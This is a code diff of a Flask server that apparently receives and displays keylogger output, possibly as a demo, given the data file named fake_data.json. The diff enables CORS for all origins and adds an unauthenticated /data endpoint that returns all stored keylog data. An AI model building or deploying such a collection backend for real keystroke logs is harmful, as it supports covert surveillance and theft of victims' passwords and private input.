@@ -1,13 +1,24 @@
 import json
 from flask import Flask, render_template, jsonify, request
+from flask_cors import CORS
 from server_util.util import decrypt_data
 
 app = Flask(__name__, template_folder='templates', static_folder='static')
+CORS(app)
 
-json_path = 'server/static/json/fake_data.json'
+# Load existing data (replace with your actual file path)
+DATA_FILE = "server/static/json/fake_data.json"
 
-with open(json_path, 'r+') as file:
-    json_data = json.load(file)
+try:
+    with open(DATA_FILE, "r") as file:
+        json_data = json.load(file)
+except FileNotFoundError:
+    json_data = {}
+
+@app.route('/data', methods=['GET'])
+def get_all_data():
+    """Returns all keylog data as JSON."""
+    return jsonify(json_data)
 
 @app.route('/')
 def index():
